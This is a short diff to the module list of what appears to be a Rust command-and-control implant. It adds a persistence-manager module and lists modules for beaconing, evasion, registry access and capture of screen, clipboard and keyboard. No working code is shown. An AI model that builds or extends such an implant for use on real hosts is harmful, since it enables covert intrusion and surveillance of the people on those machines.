@@ -19,7 +19,8 @@
 //!   netinfo  the network configuration of the host
 //!   sessions interactive sessions (a process the operator writes to)
 //!   desktop the screen, the clipboard and the keyboard
-//!   install installing the implant and replacing it
+//!   persist the persistence manager and its technique catalogue
+//!   install replacing the running implant with a new build
 //!   proc    the process table of the host
 //!   registry the Windows registry
 //!   beacon   the actual loop
@@ -34,6 +35,7 @@ pub mod evade;
 pub mod install;
 pub mod link;
 pub mod netinfo;
+pub mod persist;
 pub mod post;
 pub mod proc;
 pub mod registry;
